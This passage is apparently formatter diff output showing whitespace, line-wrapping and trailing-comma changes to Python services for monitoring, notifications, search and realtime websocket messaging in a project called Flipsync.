         """Delete a document by ID.
-        
+
         Args:
             doc_id: The document ID
-            
+
         Returns:
             True if successful, False otherwise
         """
         try:
             # Delete document from dictionary
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/qdrant/simple_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/search/__init__.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/search/__init__.py	2025-06-19 04:04:11.312957+00:00
@@ -13,19 +13,22 @@
 except ImportError:
     SearchAnalytics = None
 
 # Import advanced search with fallback
 try:
-    from fs_agt_clean.services.search.advanced_search import AdvancedSearchEngine as AdvancedSearchService
+    from fs_agt_clean.services.search.advanced_search import (
+        AdvancedSearchEngine as AdvancedSearchService,
+    )
 except ImportError:
     # Create a simple fallback class
     class AdvancedSearchService:
         def __init__(self, *args, **kwargs):
             pass
 
         async def search(self, *args, **kwargs):
             return []
+
 
 # Import models if available
 try:
     from fs_agt_clean.services.search.models import SearchQuery, SearchFilter
 except ImportError:
@@ -36,13 +39,14 @@
 
     class SearchFilter:
         def __init__(self, **kwargs):
             self.filters = kwargs
 
+
 __all__ = [
     "SearchService",
     "SearchResult",
     "AdvancedSearchService",
     "SearchAnalytics",
     "SearchQuery",
     "SearchFilter",
-]
\ No newline at end of file
+]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/search/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/service.py	2025-06-19 04:04:11.550657+00:00
@@ -20,11 +20,13 @@
 from fs_agt_clean.core.notifications.device_manager import DeviceManager
 from fs_agt_clean.database.models import Notification as DbNotification
 from fs_agt_clean.database.models import NotificationCategory as DbNotificationCategory
 from fs_agt_clean.database.models import NotificationPriority as DbNotificationPriority
 from fs_agt_clean.database.models import NotificationStatus as DbNotificationStatus
-from fs_agt_clean.database.repositories.notification_repository import NotificationRepository
+from fs_agt_clean.database.repositories.notification_repository import (
+    NotificationRepository,
+)
 from fs_agt_clean.services.metrics.service import MetricsService
 from fs_agt_clean.services.notifications.email_service import EmailService
 from fs_agt_clean.services.notifications.push_service import PushService
 from fs_agt_clean.services.notifications.templates.base import NotificationTemplate
 
@@ -430,11 +432,13 @@
         Returns:
             Optional[str]: Status if found
         """
         try:
             # Try to get from database first
-            notification = await self.notification_repository.find_by_id(notification_id)
+            notification = await self.notification_repository.find_by_id(
+                notification_id
+            )
             if notification:
                 return notification.status.value
 
             # Fall back to in-memory tracking for backward compatibility
             if notification_id in self._delivered:
@@ -464,19 +468,24 @@
         Returns:
             bool: True if retry was successful
         """
         try:
             # Try to get from database first
-            notification_db = await self.notification_repository.find_by_id(notification_id)
-            if notification_db and notification_db.status == DbNotificationStatus.FAILED:
+            notification_db = await self.notification_repository.find_by_id(
+                notification_id
+            )
+            if (
+                notification_db
+                and notification_db.status == DbNotificationStatus.FAILED
+            ):
                 # Reset delivery attempts in database
                 await self.notification_repository.update(
                     notification_id,
                     {
                         "status": DbNotificationStatus.PENDING,
                         "delivery_attempts": {},
-                    }
+                    },
                 )
 
                 # Check if we have in-memory tracking for this notification
                 if notification_id in self._failed:
                     notification = self._failed.pop(notification_id)
@@ -485,14 +494,24 @@
                 else:
                     # Create in-memory tracking for backward compatibility
                     self._pending[notification_id] = {
                         "user_id": notification_db.user_id,
                         "template_id": notification_db.template_id,
-                        "category": notification_db.category.value if notification_db.category else None,
+                        "category": (
+                            notification_db.category.value
+                            if notification_db.category
+                            else None
+                        ),
                         "data": notification_db.data or {},
-                        "priority": notification_db.priority.value if notification_db.priority else NotificationPriority.MEDIUM,
-                        "delivery_methods": set(notification_db.delivery_methods or ["push", "email"]),
+                        "priority": (
+                            notification_db.priority.value
+                            if notification_db.priority
+                            else NotificationPriority.MEDIUM
+                        ),
+                        "delivery_methods": set(
+                            notification_db.delivery_methods or ["push", "email"]
+                        ),
                         "attempts": 0,
                         "created_at": notification_db.created_at,
                         "db_notification": notification_db,
                     }
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/notifications/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/production_monitoring_service.py	2025-06-14 20:35:30.843858+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/production_monitoring_service.py	2025-06-19 04:04:11.771837+00:00
@@ -19,97 +19,99 @@
 logger = logging.getLogger(__name__)
 
 
 class HealthStatus(str, Enum):
     """System health status levels."""
+
     HEALTHY = "healthy"
     WARNING = "warning"
     CRITICAL = "critical"
     UNKNOWN = "unknown"
 
 
 class AlertLevel(str, Enum):
     """Alert severity levels."""
+
     INFO = "info"
     WARNING = "warning"
     ERROR = "error"
     CRITICAL = "critical"
 
 
 class SystemMetrics:
     """System performance metrics."""
-    
+
     def __init__(self):
         self.cpu_usage = 0.0
         self.memory_usage = 0.0
         self.disk_usage = 0.0
         self.network_io = {"bytes_sent": 0, "bytes_recv": 0}
         self.process_count = 0
         self.uptime_seconds = 0
         self.timestamp = datetime.now(timezone.utc)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "cpu_usage_percent": self.cpu_usage,
             "memory_usage_percent": self.memory_usage,
             "disk_usage_percent": self.disk_usage,
             "network_io": self.network_io,
             "process_count": self.process_count,
             "uptime_seconds": self.uptime_seconds,
-            "timestamp": self.timestamp.isoformat()
+            "timestamp": self.timestamp.isoformat(),
         }
 
 
 class ServiceHealthCheck:
     """Health check result for a service."""
-    
+
     def __init__(
         self,
         service_name: str,
         status: HealthStatus,
         response_time_ms: float,
         details: Optional[Dict[str, Any]] = None,
-        error_message: Optional[str] = None
+        error_message: Optional[str] = None,
     ):
         self.service_name = service_name
         self.status = status
         self.response_time_ms = response_time_ms
         self.details = details or {}
         self.error_message = error_message
         self.timestamp = datetime.now(timezone.utc)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "service_name": self.service_name,
             "status": self.status.value,
             "response_time_ms": self.response_time_ms,
             "details": self.details,
             "error_message": self.error_message,
-            "timestamp": self.timestamp.isoformat()
+            "timestamp": self.timestamp.isoformat(),
         }
 
 
 class ProductionMonitoringService:
     """
     Production monitoring service for comprehensive system oversight.
-    
+
     This service provides:
     - Real-time system health monitoring
     - Performance metrics collection and analysis
     - Error rate tracking and alerting
     - Service availability monitoring
     """
-    
+
     def __init__(self):
         """Initialize the production monitoring service."""
         self.start_time = datetime.now(timezone.utc)
         self.metrics_history: List[SystemMetrics] = []
         self.health_checks: Dict[str, ServiceHealthCheck] = {}
         self.alerts: List[Dict[str, Any]] = []
-        
+
         # Monitoring configuration
         self.config = {
             "cpu_warning_threshold": 70.0,
             "cpu_critical_threshold": 90.0,
             "memory_warning_threshold": 80.0,
@@ -117,421 +119,462 @@
             "disk_warning_threshold": 85.0,
             "disk_critical_threshold": 95.0,
             "response_time_warning_ms": 1000.0,
             "response_time_critical_ms": 5000.0,
             "metrics_retention_hours": 24,
-            "health_check_interval_seconds": 60
+            "health_check_interval_seconds": 60,
         }
-        
+
         # Background monitoring task
         self._monitoring_task: Optional[asyncio.Task] = None
         self._start_monitoring()
-        
+
         logger.info("Production Monitoring Service initialized")
-    
+
     def _start_monitoring(self):
         """Start background monitoring task."""
         try:
             self._monitoring_task = asyncio.create_task(self._monitor_system())
         except Exception as e:
             logger.error(f"Error starting monitoring task: {e}")
-    
+
     async def _monitor_system(self):
         """Background system monitoring loop."""
         while True:
             try:
                 await asyncio.sleep(self.config["health_check_interval_seconds"])
-                
+
                 # Collect system metrics
                 await self._collect_system_metrics()
-                
+
                 # Perform health checks
                 await self._perform_health_checks()
-                
+
                 # Clean up old data
                 await self._cleanup_old_data()
-                
+
             except asyncio.CancelledError:
                 break
             except Exception as e:
                 logger.error(f"Error in monitoring loop: {e}")
-    
+
     async def _collect_system_metrics(self):
         """Collect current system metrics."""
         try:
             metrics = SystemMetrics()
-            
+
             # CPU usage
             metrics.cpu_usage = psutil.cpu_percent(interval=1)
-            
+
             # Memory usage
             memory = psutil.virtual_memory()
             metrics.memory_usage = memory.percent
-            
+
             # Disk usage
-            disk = psutil.disk_usage('/')
+            disk = psutil.disk_usage("/")
             metrics.disk_usage = (disk.used / disk.total) * 100
-            
+
             # Network I/O
             network = psutil.net_io_counters()
             metrics.network_io = {
                 "bytes_sent": network.bytes_sent,
-                "bytes_recv": network.bytes_recv
-            }
-            
+                "bytes_recv": network.bytes_recv,
+            }
+
             # Process count
             metrics.process_count = len(psutil.pids())
-            
+
             # Uptime
-            metrics.uptime_seconds = (datetime.now(timezone.utc) - self.start_time).total_seconds()
-            
+            metrics.uptime_seconds = (
+                datetime.now(timezone.utc) - self.start_time
+            ).total_seconds()
+
             # Store metrics
             self.metrics_history.append(metrics)
-            
+
             # Check for alerts
             await self._check_metric_alerts(metrics)
-            
+
         except Exception as e:
             logger.error(f"Error collecting system metrics: {e}")
-    
+
     async def _perform_health_checks(self):
         """Perform health checks on all services."""
         try:
             # Check core services
             await self._check_vector_service_health()
             await self._check_subscription_service_health()
             await self._check_websocket_service_health()
             await self._check_workflow_service_health()
-            
+
         except Exception as e:
             logger.error(f"Error performing health checks: {e}")
-    
+
     async def _check_vector_service_health(self):
         """Check vector database service health."""
         try:
             start_time = time.time()
-            
+
             from fs_agt_clean.services.vector.embedding_service import embedding_service
-            
+
             # Test embedding generation
-            test_embedding = await embedding_service.generate_embedding("health check test")
+            test_embedding = await embedding_service.generate_embedding(
+                "health check test"
+            )
             response_time = (time.time() - start_time) * 1000
-            
+
             if test_embedding:
                 status = HealthStatus.HEALTHY
                 details = {"embedding_dimension": len(test_embedding)}
                 error_message = None
             else:
                 status = HealthStatus.WARNING
                 details = {}
                 error_message = "Failed to generate test embedding"
-            
+
             # Check response time
             if response_time > self.config["response_time_critical_ms"]:
                 status = HealthStatus.CRITICAL
             elif response_time > self.config["response_time_warning_ms"]:
-                status = HealthStatus.WARNING if status == HealthStatus.HEALTHY else status
-            
+                status = (
+                    HealthStatus.WARNING if status == HealthStatus.HEALTHY else status
+                )
+
             self.health_checks["vector_service"] = ServiceHealthCheck(
                 service_name="vector_service",
                 status=status,
                 response_time_ms=response_time,
                 details=details,
-                error_message=error_message
-            )
-            
+                error_message=error_message,
+            )
+
         except Exception as e:
             self.health_checks["vector_service"] = ServiceHealthCheck(
                 service_name="vector_service",
                 status=HealthStatus.CRITICAL,
                 response_time_ms=0.0,
-                error_message=str(e)
-            )
-    
+                error_message=str(e),
+            )
+
     async def _check_subscription_service_health(self):
         """Check subscription service health."""
         try:
             start_time = time.time()
-            
-            from fs_agt_clean.services.subscription.enhanced_subscription_service import enhanced_subscription_service
-            
+
+            from fs_agt_clean.services.subscription.enhanced_subscription_service import (
+                enhanced_subscription_service,
+            )
+
             # Test subscription plans retrieval
             plans = enhanced_subscription_service.get_subscription_plans()
             response_time = (time.time() - start_time) * 1000
-            
+
             if plans and len(plans) > 0:
                 status = HealthStatus.HEALTHY
                 details = {"plans_count": len(plans)}
                 error_message = None
             else:
                 status = HealthStatus.WARNING
                 details = {}
                 error_message = "No subscription plans available"
-            
+
             self.health_checks["subscription_service"] = ServiceHealthCheck(
                 service_name="subscription_service",
                 status=status,
                 response_time_ms=response_time,
                 details=details,
-                error_message=error_message
-            )
-            
+                error_message=error_message,
+            )
+
         except Exception as e:
             self.health_checks["subscription_service"] = ServiceHealthCheck(
                 service_name="subscription_service",
                 status=HealthStatus.CRITICAL,
                 response_time_ms=0.0,
-                error_message=str(e)
-            )
-    
+                error_message=str(e),
+            )
+
     async def _check_websocket_service_health(self):
         """Check WebSocket service health."""
         try:
             start_time = time.time()
-            
-            from fs_agt_clean.core.websocket.enhanced_websocket_manager import enhanced_websocket_manager
-            
+
+            from fs_agt_clean.core.websocket.enhanced_websocket_manager import (
+                enhanced_websocket_manager,
+            )
+
             # Test WebSocket manager stats
             stats = enhanced_websocket_manager.get_connection_stats()
             response_time = (time.time() - start_time) * 1000
-            
+
             status = HealthStatus.HEALTHY
             details = {
                 "active_connections": stats.get("active_connections", 0),
                 "total_connections": stats.get("total_connections", 0),
-                "fastapi_available": stats.get("fastapi_available", False)
-            }
-            
+                "fastapi_available": stats.get("fastapi_available", False),
+            }
+
             self.health_checks["websocket_service"] = ServiceHealthCheck(
                 service_name="websocket_service",
                 status=status,
                 response_time_ms=response_time,
-                details=details
-            )
-            
+                details=details,
+            )
+
         except Exception as e:
             self.health_checks["websocket_service"] = ServiceHealthCheck(
                 service_name="websocket_service",
                 status=HealthStatus.CRITICAL,
                 response_time_ms=0.0,
-                error_message=str(e)
-            )
-    
+                error_message=str(e),
+            )
+
     async def _check_workflow_service_health(self):
         """Check approval workflow service health."""
         try:
             start_time = time.time()
-            
-            from fs_agt_clean.services.workflow.approval_workflow_service import approval_workflow_service
-            
+
+            from fs_agt_clean.services.workflow.approval_workflow_service import (
+                approval_workflow_service,
+            )
+
             # Test workflow stats
             stats = approval_workflow_service.get_workflow_stats()
             response_time = (time.time() - start_time) * 1000
-            
+
             status = HealthStatus.HEALTHY
             details = {
                 "active_requests": stats.get("active_requests", 0),
                 "completed_requests": stats.get("completed_requests", 0),
-                "timeout_monitor_running": stats.get("timeout_monitor_running", False)
-            }
-            
+                "timeout_monitor_running": stats.get("timeout_monitor_running", False),
+            }
+
             self.health_checks["workflow_service"] = ServiceHealthCheck(
                 service_name="workflow_service",
                 status=status,
                 response_time_ms=response_time,
-                details=details
-            )
-            
+                details=details,
+            )
+
         except Exception as e:
             self.health_checks["workflow_service"] = ServiceHealthCheck(
                 service_name="workflow_service",
                 status=HealthStatus.CRITICAL,
                 response_time_ms=0.0,
-                error_message=str(e)
-            )
-    
+                error_message=str(e),
+            )
+
     async def _check_metric_alerts(self, metrics: SystemMetrics):
         """Check metrics for alert conditions."""
         try:
             # CPU alerts
             if metrics.cpu_usage >= self.config["cpu_critical_threshold"]:
                 await self._create_alert(
                     AlertLevel.CRITICAL,
                     "High CPU Usage",
-                    f"CPU usage is {metrics.cpu_usage:.1f}% (critical threshold: {self.config['cpu_critical_threshold']}%)"
+                    f"CPU usage is {metrics.cpu_usage:.1f}% (critical threshold: {self.config['cpu_critical_threshold']}%)",
                 )
             elif metrics.cpu_usage >= self.config["cpu_warning_threshold"]:
                 await self._create_alert(
                     AlertLevel.WARNING,
                     "Elevated CPU Usage",
-                    f"CPU usage is {metrics.cpu_usage:.1f}% (warning threshold: {self.config['cpu_warning_threshold']}%)"
-                )
-            
+                    f"CPU usage is {metrics.cpu_usage:.1f}% (warning threshold: {self.config['cpu_warning_threshold']}%)",
+                )
+
             # Memory alerts
             if metrics.memory_usage >= self.config["memory_critical_threshold"]:
                 await self._create_alert(
                     AlertLevel.CRITICAL,
                     "High Memory Usage",
-                    f"Memory usage is {metrics.memory_usage:.1f}% (critical threshold: {self.config['memory_critical_threshold']}%)"
+                    f"Memory usage is {metrics.memory_usage:.1f}% (critical threshold: {self.config['memory_critical_threshold']}%)",
                 )
             elif metrics.memory_usage >= self.config["memory_warning_threshold"]:
                 await self._create_alert(
                     AlertLevel.WARNING,
                     "Elevated Memory Usage",
-                    f"Memory usage is {metrics.memory_usage:.1f}% (warning threshold: {self.config['memory_warning_threshold']}%)"
-                )
-            
+                    f"Memory usage is {metrics.memory_usage:.1f}% (warning threshold: {self.config['memory_warning_threshold']}%)",
+                )
+
             # Disk alerts
             if metrics.disk_usage >= self.config["disk_critical_threshold"]:
                 await self._create_alert(
                     AlertLevel.CRITICAL,
                     "High Disk Usage",
-                    f"Disk usage is {metrics.disk_usage:.1f}% (critical threshold: {self.config['disk_critical_threshold']}%)"
+                    f"Disk usage is {metrics.disk_usage:.1f}% (critical threshold: {self.config['disk_critical_threshold']}%)",
                 )
             elif metrics.disk_usage >= self.config["disk_warning_threshold"]:
                 await self._create_alert(
                     AlertLevel.WARNING,
                     "Elevated Disk Usage",
-                    f"Disk usage is {metrics.disk_usage:.1f}% (warning threshold: {self.config['disk_warning_threshold']}%)"
-                )
-            
+                    f"Disk usage is {metrics.disk_usage:.1f}% (warning threshold: {self.config['disk_warning_threshold']}%)",
+                )
+
         except Exception as e:
             logger.error(f"Error checking metric alerts: {e}")
-    
+
     async def _create_alert(self, level: AlertLevel, title: str, message: str):
         """Create a new alert."""
         try:
             alert = {
                 "id": f"alert_{int(time.time())}",
                 "level": level.value,
                 "title": title,
                 "message": message,
                 "timestamp": datetime.now(timezone.utc).isoformat(),
-                "acknowledged": False
-            }
-            
+                "acknowledged": False,
+            }
+
             self.alerts.append(alert)
-            
+
             # Keep only recent alerts (last 100)
             if len(self.alerts) > 100:
                 self.alerts = self.alerts[-100:]
-            
+
             logger.warning(f"Alert created: {level.value} - {title}: {message}")
-            
+
         except Exception as e:
             logger.error(f"Error creating alert: {e}")
-    
+
     async def _cleanup_old_data(self):
         """Clean up old metrics and data."""
         try:
             # Remove old metrics
-            cutoff_time = datetime.now(timezone.utc) - timedelta(hours=self.config["metrics_retention_hours"])
+            cutoff_time = datetime.now(timezone.utc) - timedelta(
+                hours=self.config["metrics_retention_hours"]
+            )
             self.metrics_history = [
-                metric for metric in self.metrics_history 
+                metric
+                for metric in self.metrics_history
                 if metric.timestamp > cutoff_time
             ]
-            
+
         except Exception as e:
             logger.error(f"Error cleaning up old data: {e}")
-    
+
     def get_system_health(self) -> Dict[str, Any]:
         """Get overall system health status."""
         try:
             # Determine overall health
             overall_status = HealthStatus.HEALTHY
-            
+
             # Check service health
             for health_check in self.health_checks.values():
                 if health_check.status == HealthStatus.CRITICAL:
                     overall_status = HealthStatus.CRITICAL
                     break
-                elif health_check.status == HealthStatus.WARNING and overall_status == HealthStatus.HEALTHY:
+                elif (
+                    health_check.status == HealthStatus.WARNING
+                    and overall_status == HealthStatus.HEALTHY
+                ):
                     overall_status = HealthStatus.WARNING
-            
+
             # Get latest metrics
             latest_metrics = self.metrics_history[-1] if self.metrics_history else None
-            
+
             # Count alerts by level
             alert_counts = {
-                "critical": sum(1 for alert in self.alerts if alert["level"] == "critical" and not alert["acknowledged"]),
-                "error": sum(1 for alert in self.alerts if alert["level"] == "error" and not alert["acknowledged"]),
-                "warning": sum(1 for alert in self.alerts if alert["level"] == "warning" and not alert["acknowledged"]),
-                "info": sum(1 for alert in self.alerts if alert["level"] == "info" and not alert["acknowledged"])
-            }
-            
+                "critical": sum(
+                    1
+                    for alert in self.alerts
+                    if alert["level"] == "critical" and not alert["acknowledged"]
+                ),
+                "error": sum(
+                    1
+                    for alert in self.alerts
+                    if alert["level"] == "error" and not alert["acknowledged"]
+                ),
+                "warning": sum(
+                    1
+                    for alert in self.alerts
+                    if alert["level"] == "warning" and not alert["acknowledged"]
+                ),
+                "info": sum(
+                    1
+                    for alert in self.alerts
+                    if alert["level"] == "info" and not alert["acknowledged"]
+                ),
+            }
+
             return {
                 "overall_status": overall_status.value,
-                "uptime_seconds": (datetime.now(timezone.utc) - self.start_time).total_seconds(),
+                "uptime_seconds": (
+                    datetime.now(timezone.utc) - self.start_time
+                ).total_seconds(),
                 "services": {
                     service_name: health_check.to_dict()
                     for service_name, health_check in self.health_checks.items()
                 },
                 "latest_metrics": latest_metrics.to_dict() if latest_metrics else None,
                 "alert_counts": alert_counts,
-                "monitoring_active": self._monitoring_task is not None and not self._monitoring_task.done(),
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "monitoring_active": self._monitoring_task is not None
+                and not self._monitoring_task.done(),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error(f"Error getting system health: {e}")
             return {
                 "overall_status": HealthStatus.UNKNOWN.value,
                 "error": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }
-    
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+            }
+
     def get_performance_metrics(self, hours: int = 1) -> Dict[str, Any]:
         """Get performance metrics for the specified time period."""
         try:
             cutoff_time = datetime.now(timezone.utc) - timedelta(hours=hours)
             recent_metrics = [
-                metric for metric in self.metrics_history 
+                metric
+                for metric in self.metrics_history
                 if metric.timestamp > cutoff_time
             ]
-            
+
             if not recent_metrics:
                 return {"error": "No metrics available for the specified time period"}
-            
+
             # Calculate averages
             avg_cpu = sum(m.cpu_usage for m in recent_metrics) / len(recent_metrics)
-            avg_memory = sum(m.memory_usage for m in recent_metrics) / len(recent_metrics)
+            avg_memory = sum(m.memory_usage for m in recent_metrics) / len(
+                recent_metrics
+            )
             avg_disk = sum(m.disk_usage for m in recent_metrics) / len(recent_metrics)
-            
+
             # Find peaks
             max_cpu = max(m.cpu_usage for m in recent_metrics)
             max_memory = max(m.memory_usage for m in recent_metrics)
             max_disk = max(m.disk_usage for m in recent_metrics)
-            
+
             return {
                 "time_period_hours": hours,
                 "metrics_count": len(recent_metrics),
                 "averages": {
                     "cpu_usage_percent": round(avg_cpu, 2),
                     "memory_usage_percent": round(avg_memory, 2),
-                    "disk_usage_percent": round(avg_disk, 2)
+                    "disk_usage_percent": round(avg_disk, 2),
                 },
                 "peaks": {
                     "max_cpu_usage_percent": round(max_cpu, 2),
                     "max_memory_usage_percent": round(max_memory, 2),
-                    "max_disk_usage_percent": round(max_disk, 2)
+                    "max_disk_usage_percent": round(max_disk, 2),
                 },
                 "latest_metrics": recent_metrics[-1].to_dict(),
-                "generated_at": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "generated_at": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error(f"Error getting performance metrics: {e}")
             return {"error": str(e)}
-    
+
     def get_alerts(self, acknowledged: Optional[bool] = None) -> List[Dict[str, Any]]:
         """Get alerts, optionally filtered by acknowledgment status."""
         try:
             if acknowledged is None:
                 return self.alerts.copy()
             else:
                 return [
-                    alert for alert in self.alerts 
+                    alert
+                    for alert in self.alerts
                     if alert["acknowledged"] == acknowledged
                 ]
         except Exception as e:
             logger.error(f"Error getting alerts: {e}")
             return []
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/monitoring/production_monitoring_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/realtime_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/realtime_service.py	2025-06-19 04:04:12.083528+00:00
@@ -12,24 +12,29 @@
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional
 
 from fs_agt_clean.core.websocket.manager import websocket_manager
 from fs_agt_clean.core.websocket.events import (
-    EventType, SenderType, AgentType,
-    create_message_event, create_typing_event, create_agent_status_event,
-    create_system_alert_event, create_error_event
+    EventType,
+    SenderType,
+    AgentType,
+    create_message_event,
+    create_typing_event,
+    create_agent_status_event,
+    create_system_alert_event,
+    create_error_event,
 )
 from fs_agt_clean.database.repositories.chat_repository import ChatRepository
 from fs_agt_clean.database.repositories.agent_repository import AgentRepository
 from fs_agt_clean.core.db.database import get_database
 
 logger = logging.getLogger(__name__)
 
 
 class RealtimeService:
     """High-level real-time communication service."""
-    
+
     def __init__(self, database=None):
         # Initialize repositories as None - they will be created when needed
         self._chat_repository = None
         self._agent_repository = None
         self._database = database
@@ -54,43 +59,45 @@
 
     @property
     def database(self):
         """Get database instance."""
         if self._database is None:
-            raise RuntimeError("Database not initialized - RealtimeService requires database injection")
+            raise RuntimeError(
+                "Database not initialized - RealtimeService requires database injection"
+            )
         return self._database
-    
+
     async def send_chat_message(
         self,
         conversation_id: str,
         content: str,
         sender: SenderType,
         agent_type: Optional[AgentType] = None,
         user_id: Optional[str] = None,
         thread_id: Optional[str] = None,
         parent_id: Optional[str] = None,
         metadata: Optional[Dict[str, Any]] = None,
-        session=None
+        session=None,
     ) -> Dict[str, Any]:
         """
         Send a chat message and broadcast it to conversation participants.
-        
+
         Args:
             conversation_id: Target conversation ID
             content: Message content
             sender: Message sender type
             agent_type: Agent type if sender is agent
             user_id: User ID if sender is user
             thread_id: Optional thread ID
             parent_id: Optional parent message ID
             metadata: Optional message metadata
-            
+
         Returns:
             Dictionary with message details and delivery status
         """
         start_time = datetime.now(timezone.utc)
-        
+
         try:
             # Store message in database
             if session:
                 # Use provided session
                 db_message = await self.chat_repository.create_message(
@@ -99,11 +106,11 @@
                     content=content,
                     sender=sender.value,
                     agent_type=agent_type.value if agent_type else None,
                     thread_id=thread_id,
                     parent_id=parent_id,
-                    metadata=metadata or {}
+                    metadata=metadata or {},
                 )
             else:
                 # Use own database session (fallback)
                 async with self.database.get_session() as db_session:
                     db_message = await self.chat_repository.create_message(
@@ -112,110 +119,108 @@
                         content=content,
                         sender=sender.value,
                         agent_type=agent_type.value if agent_type else None,
                         thread_id=thread_id,
                         parent_id=parent_id,
-                        metadata=metadata or {}
+                        metadata=metadata or {},
                     )
-            
+
             # Create WebSocket event
             message_event = create_message_event(
                 conversation_id=conversation_id,
                 message_id=str(db_message.id),
                 content=content,
                 sender=sender,
                 agent_type=agent_type,
                 thread_id=thread_id,
                 parent_id=parent_id,
-                metadata=metadata
-            )
-            
+                metadata=metadata,
+            )
+
             # Broadcast to conversation participants
             recipients = await websocket_manager.send_to_conversation(
-                conversation_id,
-                message_event.dict()
-            )
-            
+                conversation_id, message_event.dict()
+            )
+
             # Track latency
             end_time = datetime.now(timezone.utc)
             latency_ms = (end_time - start_time).total_seconds() * 1000
             self._track_latency(latency_ms)
-            
+
             logger.info(
                 f"Message sent to conversation {conversation_id}: "
                 f"{recipients} recipients, {latency_ms:.2f}ms latency"
             )
-            
+
             return {
                 "message_id": str(db_message.id),
                 "conversation_id": conversation_id,
                 "recipients": recipients,
                 "latency_ms": latency_ms,
-                "timestamp": db_message.timestamp.isoformat()
+                "timestamp": db_message.timestamp.isoformat(),
             }
-            
+
         except Exception as e:
             logger.error(f"Error sending chat message: {e}")
             raise
-    
+
     async def send_typing_indicator(
         self,
         conversation_id: str,
         is_typing: bool,
         user_id: Optional[str] = None,
-        agent_type: Optional[AgentType] = None
+        agent_type: Optional[AgentType] = None,
     ) -> int:
         """
         Send typing indicator to conversation participants.
-        
+
         Args:
             conversation_id: Target conversation ID
             is_typing: Whether user/agent is typing
             user_id: User ID if user is typing
             agent_type: Agent type if agent is typing
-            
+
         Returns:
             Number of recipients
         """
         try:
             typing_event = create_typing_event(
                 conversation_id=conversation_id,
                 is_typing=is_typing,
                 user_id=user_id,
-                agent_type=agent_type
-            )
-            
+                agent_type=agent_type,
+            )
+
             recipients = await websocket_manager.send_to_conversation(
-                conversation_id,
-                typing_event.dict()
-            )
-            
+                conversation_id, typing_event.dict()
+            )
+
             logger.debug(f"Typing indicator sent to {recipients} recipients")
             return recipients
-            
+
         except Exception as e:
             logger.error(f"Error sending typing indicator: {e}")
             return 0
-    
+
     async def broadcast_agent_status(
         self,
         agent_id: str,
         agent_type: AgentType,
         status: str,
         metrics: Optional[Dict[str, Any]] = None,
-        error_message: Optional[str] = None
+        error_message: Optional[str] = None,
     ) -> int:
         """
         Broadcast agent status update to all connected clients.
-        
+
         Args:
             agent_id: Agent identifier
             agent_type: Type of agent
             status: Current status
             metrics: Optional performance metrics
             error_message: Optional error message
-            
+
         Returns:
             Number of recipients
         """
         try:
             # Update database
@@ -224,172 +229,185 @@
                     session=session,
                     agent_id=agent_id,
                     agent_type=agent_type.value,
                     status=status,
                     metrics=metrics,
-                    config={}
+                    config={},
                 )
-            
+
             # Create status event
             status_event = create_agent_status_event(
                 agent_id=agent_id,
                 agent_type=agent_type,
                 status=status,
                 metrics=metrics,
-                error_message=error_message
-            )
-            
+                error_message=error_message,
+            )
+
             # Broadcast to all clients
             recipients = await websocket_manager.broadcast(status_event.dict())
-            
-            logger.info(f"Agent status broadcasted: {agent_id} -> {status} ({recipients} recipients)")
+
+            logger.info(
+                f"Agent status broadcasted: {agent_id} -> {status} ({recipients} recipients)"
+            )
             return recipients
-            
+
         except Exception as e:
             logger.error(f"Error broadcasting agent status: {e}")
             return 0
-    
+
     async def send_system_alert(
         self,
         severity: str,
         title: str,
         message: str,
         source: str,
         action_required: bool = False,
         action_url: Optional[str] = None,
-        target_users: Optional[List[str]] = None
+        target_users: Optional[List[str]] = None,
     ) -> int:
         """
         Send system alert to users.
-        
+
         Args:
             severity: Alert severity level
             title: Alert title
             message: Alert message
             source: Alert source
             action_required: Whether action is required
             action_url: Optional action URL
             target_users: Optional list of target user IDs
-            
+
         Returns:
             Number of recipients
         """
         try:
             alert_event = create_system_alert_event(
                 severity=severity,
                 title=title,
                 message=message,
                 source=source,
                 action_required=action_required,
-                action_url=action_url
-            )
-            
+                action_url=action_url,
+            )
+
             recipients = 0
-            
+
             if target_users:
                 # Send to specific users
                 for user_id in target_users:
                     user_recipients = await websocket_manager.send_to_user(
-                        user_id,
-                        alert_event.dict()
+                        user_id, alert_event.dict()
                     )
                     recipients += user_recipients
             else:
                 # Broadcast to all clients
                 recipients = await websocket_manager.broadcast(alert_event.dict())
-            
+
             logger.info(f"System alert sent: {title} ({recipients} recipients)")
             return recipients
-            
+
         except Exception as e:
             logger.error(f"Error sending system alert: {e}")
             return 0
-    
+
     async def get_conversation_participants(self, conversation_id: str) -> List[str]:
         """Get list of clients connected to a conversation."""
         return websocket_manager.get_conversation_clients(conversation_id)
-    
+
     async def get_user_connections(self, user_id: str) -> List[str]:
         """Get list of connections for a user."""
         return websocket_manager.get_user_clients(user_id)
-    
-    async def disconnect_user(self, user_id: str, reason: str = "admin_disconnect") -> int:
+
+    async def disconnect_user(
+        self, user_id: str, reason: str = "admin_disconnect"
+    ) -> int:
         """Disconnect all connections for a user."""
         client_ids = websocket_manager.get_user_clients(user_id)
-        
+
         disconnected = 0
         for client_id in client_ids:
             if await websocket_manager.disconnect(client_id, reason):
                 disconnected += 1
-        
+
